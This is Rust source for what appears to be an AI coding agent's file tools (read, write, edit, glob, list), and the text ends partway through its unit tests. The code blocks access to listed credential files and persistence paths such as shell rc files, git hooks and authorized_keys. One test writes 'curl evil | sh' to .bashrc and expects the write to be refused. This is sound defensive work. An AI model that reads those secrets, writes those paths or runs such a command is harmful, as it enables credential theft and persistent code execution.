use std::fs;
use std::io::Read;
use std::path::{Path, PathBuf};
use anyhow::Result;
use async_trait::async_trait;
use ignore::WalkBuilder;
use serde_json::json;
use similar::{ChangeTag, TextDiff};

use crate::types::{Tool, ToolContext, ToolOutput};

/// Re-exported so every tool shares the *single* process-wide lock registry living in `corex-core`.
/// A second registry here would not see `corex-core`'s guards (sessions, settings) and would
/// silently reintroduce the parallel-edit lost-update bug.
pub(crate) use corex_core::lock_path;

/// Identifies sensitive system credential paths that must not be accessed arbitrarily by tools.
///
/// This is intentionally *also* consulted by the shell tool (a read-only binary such as `cat`
/// would otherwise leak secrets without ever prompting the user), so it is the single source of
/// truth for "this path holds credentials". Callers should pass a canonicalized path when the
/// file may be reached through a symlink.
pub fn is_sensitive_system_path(path: &Path) -> bool {
    let p_str = path.to_string_lossy();

    // A bare credential directory (e.g. `~/.ssh`, `/home/x/.gnupg`).
    if p_str.ends_with("/.ssh")
        || p_str.ends_with(".ssh")
        || p_str.ends_with("/.gnupg")
        || p_str.ends_with(".gnupg")
    {
        return true;
    }

    const SENSITIVE_FRAGMENTS: &[&str] = &[
        ".ssh/",
        ".gnupg/",
        ".askpass_cred",
        ".aws/credentials",
        ".docker/config.json",
        ".git-credentials",
        ".kube/config",
        ".netrc",
        ".npmrc",
        "/etc/shadow",
        "/etc/gshadow",
        "/etc/sudoers",
    ];
    if SENSITIVE_FRAGMENTS.iter().any(|frag| p_str.contains(frag)) {
        return true;
    }

    // `/proc/<pid>/{environ,mem}` expose inherited environment and process memory.
    if (p_str.starts_with("/proc/") || p_str.starts_with("/proc/self/"))
        && (p_str.ends_with("/environ") || p_str.ends_with("/mem"))
    {
        return true;
    }

    false
}

/// Paths whose modification would grant code execution or credential persistence to the user's
/// shell/tooling. Unlike [`is_sensitive_system_path`], these are *refused outright* — even in
/// YOLO mode — because writing them turns a normal file edit into persistent code execution.
pub fn is_protected_write_path(path: &Path) -> bool {
    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
        const PROTECTED_NAMES: &[&str] = &[
            ".bashrc",
            ".bash_profile",
            ".bash_login",
            ".profile",
            ".zshrc",
            ".zprofile",
            ".zshenv",
            ".gitconfig",
            ".git-credentials",
        ];
        if PROTECTED_NAMES.contains(&name) {
            return true;
        }
    }

    let p_str = path.to_string_lossy();
    p_str.contains("/.git/hooks/")
        || p_str.ends_with("/.ssh/authorized_keys")
        || p_str.contains("/authorized_keys")
        || p_str.contains("/.config/fish/config.fish")
        || p_str.contains("/etc/profile.d/")
        || p_str.contains("/etc/cron.d/")
        || p_str.contains("/etc/crontab")
}

/// Resolves a file path: expands `~/` to the user home directory,
/// preserves absolute paths, and joins relative paths with the workspace directory.
pub fn resolve_path(workspace: &Path, rel: &str) -> PathBuf {
    if let Some(stripped) = rel.strip_prefix("~/") {
        if let Some(base) = directories::BaseDirs::new() {
            return base.home_dir().join(stripped);
        }
    }
    let p = Path::new(rel);
    if p.is_absolute() {
        p.to_path_buf()
    } else {
        workspace.join(p)
    }
}

/// Detects if a file is binary by inspecting the first 1024 bytes for null bytes.
pub fn is_binary_file(path: &Path) -> bool {
    if let Ok(mut file) = fs::File::open(path) {
        let mut buffer = [0u8; 1024];
        if let Ok(bytes_read) = file.read(&mut buffer) {
            return buffer[..bytes_read].contains(&0);
        }
    }
    false
}

/// Writes content to a file atomically via a temporary file in the same directory,
/// preventing corruption if the process is interrupted.
pub fn atomic_write(path: &Path, content: &str) -> std::io::Result<()> {
    let target_path = match path.canonicalize() {
        Ok(canonical) => canonical,
        Err(_) => path.to_path_buf(),
    };
    if let Some(parent) = target_path.parent() {
        fs::create_dir_all(parent)?;
    }
    let pid = std::process::id();
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let tmp_path = target_path.with_extension(format!("tmp.{}.{}", pid, ts));
    fs::write(&tmp_path, content)?;
    fs::rename(&tmp_path, &target_path)
}

/// Formats byte counts into clean human-readable representations.
pub fn format_size(bytes: u64) -> String {
    if bytes < 1024 {
        format!("{} B", bytes)
    } else if bytes < 1024 * 1024 {
        format!("{:.1} KB", bytes as f64 / 1024.0)
    } else {
        format!("{:.1} MB", bytes as f64 / (1024.0 * 1024.0))
    }
}

// ─── 1. ReadFileTool ────────────────────────────────────────────────────────

pub struct ReadFileTool;

#[async_trait]
impl Tool for ReadFileTool {
    fn name(&self) -> &'static str {
        "read_file"
    }

    fn description(&self) -> &'static str {
        "Reads the contents of a file with line numbers and optional start/end ranges. Includes binary file protection and automatic pagination. [PREFERRED instead of shell cat]"
    }

    fn parameters(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "file_path": {
                    "type": "string",
                    "description": "The path of the file to read (relative or absolute, supports ~/)."
                },
                "start_line": {
                    "type": "integer",
                    "description": "Optional 1-indexed start line number."
                },
                "end_line": {
                    "type": "integer",
                    "description": "Optional 1-indexed end line number."
                }
            },
            "required": ["file_path"]
        })
    }

    async fn execute(&self, args: serde_json::Value, context: &ToolContext) -> Result<ToolOutput> {
        let rel_path = match args.get("file_path").and_then(|v| v.as_str()) {
            Some(p) => p,
            None => return Ok(ToolOutput::error("Missing 'file_path' argument.")),
        };

        let path = resolve_path(&context.workspace_dir, rel_path);
        if is_sensitive_system_path(&path) {
            return Ok(ToolOutput::error(format!(
                "Access denied: reading sensitive credential or authentication file '{}' is forbidden.",
                rel_path
            )));
        }
        if !path.exists() {
            return Ok(ToolOutput::error(format!("File does not exist: {}", rel_path)));
        }

        if path.is_dir() {
            return Ok(ToolOutput::error(format!(
                "Path '{}' is a directory, not a file. Use 'list_directory' to inspect directory contents.",
                rel_path
            )));
        }

        let metadata = fs::metadata(&path).ok();
        let size = metadata.as_ref().map(|m| m.len()).unwrap_or(0);

        if is_binary_file(&path) {
            return Ok(ToolOutput::success(format!(
                "[Binary file: {} ({}). Cannot display content as plain text]",
                rel_path,
                format_size(size)
            )));
        }

        if size > 10 * 1024 * 1024 {
            return Ok(ToolOutput::error(format!(
                "File '{}' is too large ({}). Maximum read limit is 10 MB to prevent memory exhaustion. Use 'run_shell_command' with head/tail or grep instead.",
                rel_path,
                format_size(size)
            )));
        }

        let content = match fs::read_to_string(&path) {
            Ok(c) => c,
            Err(e) => return Ok(ToolOutput::error(format!("Failed to read {}: {}", rel_path, e))),
        };

        let lines: Vec<&str> = content.lines().collect();
        let total_lines = lines.len();

        let start_line = args.get("start_line").and_then(|v| v.as_u64()).map(|v| v as usize);
        let end_line = args.get("end_line").and_then(|v| v.as_u64()).map(|v| v as usize);

        let default_limit = 1000;
        let s = start_line.unwrap_or(1).saturating_sub(1);
        let e = match (start_line, end_line) {
            (_, Some(end)) => end.min(total_lines),
            (Some(start), None) => (start.saturating_sub(1) + default_limit).min(total_lines),
            (None, None) => default_limit.min(total_lines),
        };

        if total_lines == 0 {
            return Ok(ToolOutput::success("(Empty file)".to_string()));
        }

        if s >= total_lines {
            return Ok(ToolOutput::error(format!(
                "Start line {} exceeds total lines {} in {}",
                s + 1,
                total_lines,
                rel_path
            )));
        }

        if s > e {
            return Ok(ToolOutput::error(format!(
                "Invalid line range: start_line ({}) cannot be greater than end_line ({}) in {}",
                s + 1,
                e,
                rel_path
            )));
        }

        let mut output = String::new();
        for (i, line) in lines[s..e].iter().enumerate() {
            output.push_str(&format!("{:4} | {}\n", s + i + 1, line));
        }

        if e < total_lines {
            output.push_str(&format!(
                "\n... [Showing lines {}-{} of {}. Specify start_line={} to continue reading]\n",
                s + 1,
                e,
                total_lines,
                e + 1
            ));
        }

        if output.is_empty() {
            output = "(Empty file)".to_string();
        }

        Ok(ToolOutput::success(output))
    }
}

// ─── 2. WriteFileTool ───────────────────────────────────────────────────────

pub struct WriteFileTool;

#[async_trait]
impl Tool for WriteFileTool {
    fn name(&self) -> &'static str {
        "write_file"
    }

    fn description(&self) -> &'static str {
        "Writes complete content to a file atomically, creating any missing parent directories. [PREFERRED for new files]"
    }

    fn parameters(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "file_path": {
                    "type": "string",
                    "description": "Path to the file to write (relative or absolute, supports ~/)."
                },
                "content": {
                    "type": "string",
                    "description": "The exact full text content to write."
                }
            },
            "required": ["file_path", "content"]
        })
    }

    fn needs_confirmation(&self, args: &serde_json::Value, context: &ToolContext) -> bool {
        if let Some(rel) = args.get("file_path").and_then(|v| v.as_str()) {
            let path = resolve_path(&context.workspace_dir, rel);
            if !path.starts_with(&context.workspace_dir) {
                return true;
            }
        }
        !context.allowed_commands.iter().any(|cmd| cmd == "write_file")
    }

    fn format_diff(&self, args: &serde_json::Value, workspace: &Path) -> Option<String> {
        let rel_path = args.get("file_path")?.as_str()?;
        let new_content = args.get("content")?.as_str()?;
        let path = resolve_path(workspace, rel_path);

        let old_content = fs::read_to_string(&path).unwrap_or_default();
        let diff = TextDiff::from_lines(old_content.as_str(), new_content);

        let mut formatted = format!("--- a/{}\n+++ b/{}\n", rel_path, rel_path);
        for change in diff.iter_all_changes() {
            let sign = match change.tag() {
                ChangeTag::Delete => "-",
                ChangeTag::Insert => "+",
                ChangeTag::Equal => " ",
            };
            formatted.push_str(&format!("{}{}", sign, change));
        }
        Some(formatted)
    }

    async fn execute(&self, args: serde_json::Value, context: &ToolContext) -> Result<ToolOutput> {
        let rel_path = match args.get("file_path").and_then(|v| v.as_str()) {
            Some(p) => p,
            None => return Ok(ToolOutput::error("Missing 'file_path' argument.")),
        };
        let content = match args.get("content").and_then(|v| v.as_str()) {
            Some(c) => c,
            None => return Ok(ToolOutput::error("Missing 'content' argument.")),
        };

        let path = resolve_path(&context.workspace_dir, rel_path);
        if is_sensitive_system_path(&path) {
            return Ok(ToolOutput::error(format!(
                "Access denied: writing to sensitive credential or authentication file '{}' is forbidden.",
                rel_path
            )));
        }
        if is_protected_write_path(&path) {
            return Ok(ToolOutput::error(format!(
                "Refusing to write to protected path '{}': shell startup files, git hooks and cron \
                 entries can execute arbitrary code. Edit it manually if this is intentional.",
                rel_path
            )));
        }

        // Serialize writes to this path so parallel batches cannot interleave their writes.
        let _guard = lock_path(&path).await;

        let existed = path.exists();
        let old_size = if existed {
            fs::metadata(&path).map(|m| m.len()).unwrap_or(0)
        } else {
            0
        };

        if let Err(e) = atomic_write(&path, content) {
            return Ok(ToolOutput::error(format!("Failed to write to {}: {}", rel_path, e)));
        }

        let line_count = content.lines().count();
        let byte_count = content.len();
        let summary_msg = if existed {
            format!(
                "Successfully updated {} ({} lines, {}, previous size: {}).",
                rel_path,
                line_count,
                format_size(byte_count as u64),
                format_size(old_size)
            )
        } else {
            format!(
                "Successfully created {} ({} lines, {}).",
                rel_path,
                line_count,
                format_size(byte_count as u64)
            )
        };

        Ok(ToolOutput::success_with_summary(
            summary_msg,
            format!("Wrote {}", rel_path),
        ))
    }
}

// ─── 3. EditTool ────────────────────────────────────────────────────────────

pub struct EditTool;

/// Lines of untouched context kept around every change in an edit preview.
const EDIT_PREVIEW_CONTEXT: usize = 3;

/// Renders what an edit did as a diff, removals included.
///
/// Showing the resulting file alone hides half of the change: whatever the edit dropped never
/// reaches the screen. Each row is `marker + line number + text`, where `-` is a line that left the
/// file, `+` one that replaced it and a space an untouched line around them, numbered on the side
/// it belongs to. Untouched stretches between distant changes are elided to keep it readable.
fn format_edit_preview(old_content: &str, new_content: &str) -> String {
    let diff = TextDiff::from_lines(old_content, new_content);

    // First pass: which rows changed, and with them which untouched ones are worth showing.
    let mut changed = Vec::new();
    let mut total_rows = 0usize;
    for (idx, change) in diff.iter_all_changes().enumerate() {
        total_rows = idx + 1;
        if change.tag() != ChangeTag::Equal {
            changed.push(idx);
        }
    }
    if changed.is_empty() {
        return String::new();
    }

    let mut keep = vec![false; total_rows];
    for &idx in &changed {
        let start = idx.saturating_sub(EDIT_PREVIEW_CONTEXT);
        let end = idx.saturating_add(EDIT_PREVIEW_CONTEXT).min(total_rows - 1);
        for slot in keep.iter_mut().take(end + 1).skip(start) {
            *slot = true;
        }
    }

    let first = changed[0].saturating_sub(EDIT_PREVIEW_CONTEXT);
    let last = changed[changed.len() - 1].saturating_add(EDIT_PREVIEW_CONTEXT).min(total_rows - 1);

    // Second pass: only the kept rows are materialised, so a large file costs nothing.
    let mut preview = String::new();
    let mut previous: Option<usize> = None;
    for (idx, change) in diff.iter_all_changes().enumerate() {
        if idx < first || idx > last || !keep[idx] {
            continue;
        }
        if let Some(previous) = previous {
            if idx > previous + 1 {
                preview.push_str(&format!("   ⋯ | {} lines not shown\n", idx - previous - 1));
            }
        }
        let (marker, number) = match change.tag() {
            ChangeTag::Delete => ('-', change.old_index().unwrap_or(0) + 1),
            ChangeTag::Insert => ('+', change.new_index().unwrap_or(0) + 1),
            ChangeTag::Equal => (' ', change.new_index().unwrap_or(0) + 1),
        };
        let text = change.value().trim_end_matches(['\n', '\r']);
        preview.push_str(&format!("{}{:4} | {}\n", marker, number, text));
        previous = Some(idx);
    }
    preview
}

#[async_trait]
impl Tool for EditTool {
    fn name(&self) -> &'static str {
        "edit"
    }

    fn description(&self) -> &'static str {
        "Replaces exact text within a file (old_string -> new_string). Includes CRLF/LF resilience, whitespace-tolerant fallback matching, intelligent diagnostics, and immediate edit preview. [PREFERRED for surgical code edits]"
    }

    fn parameters(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "file_path": {
                    "type": "string",
                    "description": "Path to the file to edit (relative or absolute, supports ~/)."
                },
                "instruction": {
                    "type": "string",
                    "description": "A clear description of what and why the change is being made."
                },
                "old_string": {
                    "type": "string",
                    "description": "The exact literal string segment to replace (including indentation and surrounding context lines)."
                },
                "new_string": {
                    "type": "string",
                    "description": "The exact literal replacement string."
                },
                "allow_multiple": {
                    "type": "boolean",
                    "description": "Whether to replace multiple occurrences if found (default false)."
                }
            },
            "required": ["file_path", "old_string", "new_string"]
        })
    }

    fn needs_confirmation(&self, args: &serde_json::Value, context: &ToolContext) -> bool {
        if let Some(rel) = args.get("file_path").and_then(|v| v.as_str()) {
            let path = resolve_path(&context.workspace_dir, rel);
            if !path.starts_with(&context.workspace_dir) {
                return true;
            }
        }
        !context.allowed_commands.iter().any(|cmd| cmd == "edit_file")
    }

    fn format_diff(&self, args: &serde_json::Value, workspace: &Path) -> Option<String> {
        let rel_path = args.get("file_path")?.as_str()?;
        let old_str = args.get("old_string")?.as_str()?;
        let new_str = args.get("new_string")?.as_str()?;
        let allow_multiple = args.get("allow_multiple").and_then(|v| v.as_bool()).unwrap_or(false);

        let path = resolve_path(workspace, rel_path);
        let content = fs::read_to_string(&path).ok()?;

        let new_content = if allow_multiple {
            content.replace(old_str, new_str)
        } else {
            content.replacen(old_str, new_str, 1)
        };

        let diff = TextDiff::from_lines(content.as_str(), new_content.as_str());
        let formatted = diff
            .unified_diff()
            .context_radius(3)
            .header(&format!("a/{}", rel_path), &format!("b/{}", rel_path))
            .to_string();
        Some(formatted)
    }

    async fn execute(&self, args: serde_json::Value, context: &ToolContext) -> Result<ToolOutput> {
        let rel_path = match args.get("file_path").and_then(|v| v.as_str()) {
            Some(p) => p,
            None => return Ok(ToolOutput::error("Missing 'file_path' argument.")),
        };
        let old_string = match args.get("old_string").and_then(|v| v.as_str()) {
            Some(s) => s,
            None => return Ok(ToolOutput::error("Missing 'old_string' argument.")),
        };
        // An empty needle matches at every offset — and exactly once on an empty file — so it would
        // silently prepend `new_string` at position 0 while reporting a successful replacement.
        if old_string.is_empty() {
            return Ok(ToolOutput::error(
                "The 'old_string' argument cannot be empty: it matches everywhere and replaces \
                 nothing meaningful. Provide the exact segment to replace, or use 'write_file' to \
                 create or fully overwrite the file.",
            ));
        }
        let new_string = match args.get("new_string").and_then(|v| v.as_str()) {
            Some(s) => s,
            None => return Ok(ToolOutput::error("Missing 'new_string' argument.")),
        };
        let allow_multiple = args.get("allow_multiple").and_then(|v| v.as_bool()).unwrap_or(false);

        let path = resolve_path(&context.workspace_dir, rel_path);
        if is_sensitive_system_path(&path) {
            return Ok(ToolOutput::error(format!(
                "Access denied: editing sensitive credential or authentication file '{}' is forbidden.",
                rel_path
            )));
        }
        if is_protected_write_path(&path) {
            return Ok(ToolOutput::error(format!(
                "Refusing to edit protected path '{}': shell startup files, git hooks and cron \
                 entries can execute arbitrary code. Edit it manually if this is intentional.",
                rel_path
            )));
        }
        if !path.exists() {
            return Ok(ToolOutput::error(format!("File does not exist: {}", rel_path)));
        }

        // Hold the per-path lock across the whole read-modify-write so a parallel batch cannot
        // read the same original and clobber this edit.
        let _guard = lock_path(&path).await;

        let content = match fs::read_to_string(&path) {
            Ok(c) => c,
            Err(e) => return Ok(ToolOutput::error(format!("Failed to read {}: {}", rel_path, e))),
        };

        // 1. Fast exact matching
        let count = content.matches(old_string).count();
        let (modified, start_line, end_line) = if count == 1 {
            let offset = content.find(old_string).unwrap();
            let start_line = content[..offset].chars().filter(|&c| c == '\n').count() + 1;
            let replaced_lines = new_string.lines().count().max(1);
            let end_line = start_line + replaced_lines - 1;
            let res = content.replacen(old_string, new_string, 1);
            (res, start_line, end_line)
        } else if count > 1 {
            if !allow_multiple {
                return Ok(ToolOutput::error(format!(
                    "old_string occurs {} times in {}. Specify allow_multiple: true or provide more surrounding context lines.",
                    count, rel_path
                )));
            }
            let res = content.replace(old_string, new_string);
            (res, 1, 1)
        } else {
            // 2. CRLF/LF newline normalization match
            let content_norm = content.replace("\r\n", "\n");
            let old_norm = old_string.replace("\r\n", "\n");
            let new_norm = new_string.replace("\r\n", "\n");
            let norm_count = content_norm.matches(&old_norm).count();

            if norm_count == 1 {
                let offset = content_norm.find(&old_norm).unwrap();
                let start_line = content_norm[..offset].chars().filter(|&c| c == '\n').count() + 1;
                let replaced_lines = new_norm.lines().count().max(1);
                let end_line = start_line + replaced_lines - 1;
                let mut res = content_norm.replacen(&old_norm, &new_norm, 1);
                if content.contains("\r\n") {
                    res = res.replace('\n', "\r\n");
                }
                (res, start_line, end_line)
            } else if norm_count > 1 && !allow_multiple {
                return Ok(ToolOutput::error(format!(
                    "old_string occurs {} times in {} (with normalized line endings). Specify allow_multiple: true or provide more surrounding context lines.",
                    norm_count, rel_path
                )));
            } else if norm_count > 1 && allow_multiple {
                let mut res = content_norm.replace(&old_norm, &new_norm);
                if content.contains("\r\n") {
                    res = res.replace('\n', "\r\n");
                }
                (res, 1, 1)
            } else {
                // 3. Flexible line-by-line trimmed matching fallback
                let content_lines: Vec<&str> = content.lines().collect();
                let old_lines: Vec<&str> = old_string.lines().collect();
                let old_trimmed: Vec<&str> = old_lines.iter().map(|l| l.trim()).collect();

                let mut matching_indices = Vec::new();
                if !old_trimmed.is_empty() && content_lines.len() >= old_trimmed.len() {
                    for i in 0..=content_lines.len() - old_trimmed.len() {
                        let matches_all = (0..old_trimmed.len())
                            .all(|j| content_lines[i + j].trim() == old_trimmed[j]);
                        if matches_all {
                            matching_indices.push(i);
                        }
                    }
                }

                if matching_indices.len() == 1 {
                    let start_idx = matching_indices[0];
                    let end_idx = start_idx + old_trimmed.len();
                    let mut new_lines = Vec::new();
                    new_lines.extend_from_slice(&content_lines[..start_idx]);
                    for nl in new_string.lines() {
                        new_lines.push(nl);
                    }
                    new_lines.extend_from_slice(&content_lines[end_idx..]);
                    let line_ending = if content.contains("\r\n") { "\r\n" } else { "\n" };
                    let mut res = new_lines.join(line_ending);
                    if content.ends_with('\n') || content.ends_with("\r\n") {
                        res.push_str(line_ending);
                    }
                    let start_line = start_idx + 1;
                    let replaced_lines = new_string.lines().count().max(1);
                    let end_line = start_line + replaced_lines - 1;
                    (res, start_line, end_line)
                } else if matching_indices.len() > 1 && !allow_multiple {
                    return Ok(ToolOutput::error(format!(
                        "old_string matches {} different locations with trimmed whitespace. Provide more surrounding context lines.",
                        matching_indices.len()
                    )));
                } else {
                    // Intelligent diagnostic hint
                    let first_non_empty = old_lines.iter().find(|l| !l.trim().is_empty()).map(|l| l.trim());
                    let hint = if let Some(target) = first_non_empty {
                        let candidates: Vec<usize> = content_lines
                            .iter()
                            .enumerate()
                            .filter(|(_, l)| l.trim() == target)
                            .map(|(i, _)| i + 1)
                            .take(3)
                            .collect();
                        if !candidates.is_empty() {
                            format!(
                                " Hint: Line(s) {:?} match the start of old_string, but surrounding lines or indentation differed.",
                                candidates
                            )
                        } else {
                            String::new()
                        }
                    } else {
                        String::new()
                    };

                    return Ok(ToolOutput::error(format!(
                        "Target old_string was not found in {}. Ensure exact whitespace and context match.{}",
                        rel_path, hint
                    )));
                }
            }
        };

        // Compare-and-swap: refuse to clobber a file that changed under us (an external editor or
        // another process may have written it between our read and this write).
        if let Ok(current) = fs::read_to_string(&path) {
            if current != content {
                return Ok(ToolOutput::error(format!(
                    "Refusing to edit {}: the file changed on disk after it was read. Re-read it and retry.",
                    rel_path
                )));
            }
        }

        if let Err(e) = atomic_write(&path, &modified) {
            return Ok(ToolOutput::error(format!("Failed to write edited content to {}: {}", rel_path, e)));
        }

        let preview = format_edit_preview(&content, &modified);
        let lines_str = if start_line == end_line {
            format!("line {}", start_line)
        } else {
            format!("lines {}-{}", start_line, end_line)
        };
        let output_msg = if !preview.is_empty() {
            format!(
                "Successfully edited {} ({}):\n{}",
                rel_path, lines_str, preview
            )
        } else {
            format!("Successfully edited {}.", rel_path)
        };

        Ok(ToolOutput::success_with_summary(
            output_msg,
            format!("Edited {}", rel_path),
        ))
    }
}

// ─── 4. GlobTool ────────────────────────────────────────────────────────────

pub struct GlobTool;

#[async_trait]
impl Tool for GlobTool {
    fn name(&self) -> &'static str {
        "glob"
    }

    fn description(&self) -> &'static str {
        "Efficiently finds files matching glob patterns (e.g. `src/**/*.rs`, `**/*.md`, `*.json`), skipping .git and respecting .gitignore. [PREFERRED instead of shell find]"
    }

    fn parameters(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "pattern": {
                    "type": "string",
                    "description": "Glob pattern (e.g. '**/*.rs', 'src/**/*.ts', '*.toml')."
                },
                "dir_path": {
                    "type": "string",
                    "description": "Optional root directory to search in (defaults to workspace root)."
                }
            },
            "required": ["pattern"]
        })
    }

    async fn execute(&self, args: serde_json::Value, context: &ToolContext) -> Result<ToolOutput> {
        let pattern_str = match args.get("pattern").and_then(|v| v.as_str()) {
            Some(p) => p,
            None => return Ok(ToolOutput::error("Missing 'pattern' argument.")),
        };

        let root_dir = args
            .get("dir_path")
            .and_then(|v| v.as_str())
            .map(|p| resolve_path(&context.workspace_dir, p))
            .unwrap_or_else(|| context.workspace_dir.clone());

        let glob_pattern = glob::Pattern::new(pattern_str);

        let mut matches = Vec::new();
        let walker = WalkBuilder::new(&root_dir)
            .hidden(false)
            .git_ignore(true)
            .filter_entry(|entry| {
                let name = entry.file_name().to_string_lossy();
                name != ".git"
            })
            .build();

        for entry in walker.flatten() {
            let path = entry.path();
            if let Ok(rel) = path.strip_prefix(&context.workspace_dir) {
                let rel_str = rel.to_string_lossy();
                let file_name = path.file_name().map(|n| n.to_string_lossy()).unwrap_or_default();
                if let Ok(ref g) = glob_pattern {
                    // Match relative path, full path, or file basename (for patterns like "*.rs")
                    if g.matches(&rel_str) || g.matches(path.to_str().unwrap_or("")) || g.matches(&file_name) {
                        matches.push(rel_str.to_string());
                        if matches.len() >= 150 {
                            break;
                        }
                    }
                }
            }
        }

        matches.sort();
        if matches.is_empty() {
            Ok(ToolOutput::success("No matching files found."))
        } else {
            let count = matches.len();
            let header = if count >= 150 {
                "Found 150+ matching files (capped at 150):\n".to_string()
            } else {
                format!("Found {} matching file(s):\n", count)
            };
            Ok(ToolOutput::success(format!("{}{}", header, matches.join("\n"))))
        }
    }
}

// ─── 5. LsTool ──────────────────────────────────────────────────────────────

pub struct LsTool;

#[async_trait]
impl Tool for LsTool {
    fn name(&self) -> &'static str {
        "list_directory"
    }

    fn description(&self) -> &'static str {
        "Lists names and sizes of files and subdirectories directly within a specified directory path. [PREFERRED instead of shell ls]"
    }

    fn parameters(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "dir_path": {
                    "type": "string",
                    "description": "The path to the directory to list (defaults to current working directory)."
                }
            }
        })
    }

    async fn execute(&self, args: serde_json::Value, context: &ToolContext) -> Result<ToolOutput> {
        let rel_path = args.get("dir_path").and_then(|v| v.as_str()).unwrap_or(".");
        let path = resolve_path(&context.workspace_dir, rel_path);

        if !path.exists() {
            return Ok(ToolOutput::error(format!("Directory does not exist: {}", rel_path)));
        }

        if !path.is_dir() {
            return Ok(ToolOutput::error(format!("Path '{}' is a file, not a directory. Use 'read_file' instead.", rel_path)));
        }

        let mut entries = Vec::new();
        match fs::read_dir(&path) {
            Ok(read_dir) => {
                for item in read_dir.flatten() {
                    let file_name = item.file_name().to_string_lossy().to_string();
                    if file_name == ".git" {
                        continue;
                    }
                    let metadata = item.metadata();
                    let is_dir = metadata.as_ref().map(|m| m.is_dir()).unwrap_or(false);
                    let size = metadata.as_ref().map(|m| m.len()).unwrap_or(0);

                    entries.push((is_dir, file_name, size));
                }
            }
            Err(e) => return Ok(ToolOutput::error(format!("Failed to list {}: {}", rel_path, e))),
        }

        // Sort entries: directories first, then alphabetically
        entries.sort_by(|a, b| {
            if a.0 && !b.0 {
                std::cmp::Ordering::Less
            } else if !a.0 && b.0 {
                std::cmp::Ordering::Greater
            } else {
                a.1.to_lowercase().cmp(&b.1.to_lowercase())
            }
        });

        let total_count = entries.len();
        if entries.len() > 150 {
            entries.truncate(150);
        }

        let mut formatted_entries = Vec::new();
        for (is_dir, name, size) in entries {
            if is_dir {
                formatted_entries.push(format!("[DIR]  {}", name));
            } else {
                formatted_entries.push(format!("{:>10}  {}", format_size(size), name));
            }
        }

        let cap_notice = if total_count > 150 {
            format!("\n... [Showing 150 of {} items]", total_count)
        } else {
            String::new()
        };

        let result = format!(
            "Directory listing for {}:\n{}{}",
            path.display(),
            if formatted_entries.is_empty() {
                "(Directory is empty)".to_string()
            } else {
                formatted_entries.join("\n")
            },
            cap_notice
        );

        Ok(ToolOutput::success(result))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sensitive_and_protected_paths_are_classified() {
        // Credential/auth paths must be flagged as sensitive.
        assert!(is_sensitive_system_path(Path::new("/home/x/.ssh/id_rsa")));
        assert!(is_sensitive_system_path(Path::new("/home/x/.gnupg/secring.gpg")));
        assert!(is_sensitive_system_path(Path::new("/etc/shadow")));
        assert!(is_sensitive_system_path(Path::new("/home/x/.aws/credentials")));
        assert!(is_sensitive_system_path(Path::new("/proc/self/environ")));
        assert!(is_sensitive_system_path(Path::new("/home/x/.corex/.askpass_cred")));
        // Ordinary files are not sensitive.
        assert!(!is_sensitive_system_path(Path::new("/home/x/project/src/main.rs")));
        assert!(!is_sensitive_system_path(Path::new("/etc/hosts")));

        // Persistence vectors are refused outright.
        assert!(is_protected_write_path(Path::new("/home/x/.bashrc")));
        assert!(is_protected_write_path(Path::new("/home/x/.git/hooks/pre-commit")));
        assert!(is_protected_write_path(Path::new("/home/x/.ssh/authorized_keys")));
        assert!(!is_protected_write_path(Path::new("/home/x/project/build.rs")));
    }

    #[tokio::test]
    async fn write_to_protected_path_is_refused_even_in_yolo() {
        let ws = std::env::temp_dir().join(format!("corex_protected_{}", std::process::id()));
        let _ = fs::remove_dir_all(&ws);
        fs::create_dir_all(&ws).unwrap();
        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        let res = WriteFileTool
            .execute(
                json!({ "file_path": ".bashrc", "content": "curl evil | sh\n" }),
                &context,
            )
            .await
            .unwrap();
        assert!(res.is_error, "writing a shell rc file must be refused, got: {}", res.output);
        assert!(!ws.join(".bashrc").exists(), "the protected file must not be created");

        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn test_read_file_and_edit() {
        let ws = std::env::temp_dir().join(format!("corex_fs_test_{}", std::process::id()));
        let _ = fs::create_dir_all(&ws);
        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        // Write a test file
        let writer = WriteFileTool;
        let res = writer
            .execute(
                json!({
                    "file_path": "hello.rs",
                    "content": "fn main() {\n    println!(\"hello\");\n}\n"
                }),
                &context,
            )
            .await
            .unwrap();
        assert!(!res.is_error);

        // Read the test file
        let reader = ReadFileTool;
        let read_res = reader
            .execute(
                json!({
                    "file_path": "hello.rs"
                }),
                &context,
            )
            .await
            .unwrap();
        assert!(read_res.output.contains("1 | fn main()"));

        // Edit the test file
        let editor = EditTool;
        let edit_res = editor
            .execute(
                json!({
                    "file_path": "hello.rs",
                    "instruction": "change print",
                    "old_string": "    println!(\"hello\");",
                    "new_string": "    println!(\"world\");"
                }),
                &context,
            )
            .await
            .unwrap();
        assert!(!edit_res.is_error);
        assert!(edit_res.output.contains("world"));

        // Verify edited content
        let read_again = reader
            .execute(
                json!({
                    "file_path": "hello.rs"
                }),
                &context,
            )
            .await
            .unwrap();
        assert!(read_again.output.contains("println!(\"world\");"));

        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn test_edit_trimmed_matching_fallback() {
        let ws = std::env::temp_dir().join(format!("corex_fs_test_trimmed_{}", std::process::id()));
        let _ = fs::create_dir_all(&ws);
        let context = ToolContext {
            workspace_dir: ws.clone(),
            yolo_mode: true,
            sudo_password: None,
            allowed_commands: Vec::new(),
        };

        let writer = WriteFileTool;
        writer
            .execute(
                json!({
                    "file_path": "sample.py",
                    "content": "def greet():\n    # greeting\n    print('hi')\n"
                }),
                &context,
            )
            .await
            .unwrap();

        let editor = EditTool;
        // Edit with slightly different leading whitespace in old_string
        let edit_res = editor
            .execute(
                json!({
                    "file_path": "sample.py",
